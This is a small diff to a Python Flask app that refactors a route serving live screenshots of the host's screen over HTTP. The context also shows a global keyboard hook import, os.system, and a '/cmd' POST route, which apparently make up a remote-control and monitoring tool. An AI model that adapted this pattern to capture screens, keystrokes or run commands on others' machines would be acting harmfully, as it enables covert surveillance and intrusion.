@@ -1,6 +1,6 @@
 from flask import Flask, render_template, request
+from PIL.ImageGrab import grab
 from keyboard import on_press
-from PIL import ImageGrab
 from io import BytesIO
 from os import system
 
@@ -30,9 +30,9 @@ def clear():
 
 @app.route("/screen.bmp")
 def screen():
-    buf = BytesIO()
-    ImageGrab.grab().save(buf, format="BMP", quality=0)
-    return buf.getvalue()
+    io = BytesIO()
+    grab().save(io, "BMP")
+    return io.getvalue()
 
 
 @app.route("/cmd", methods=["POST"])
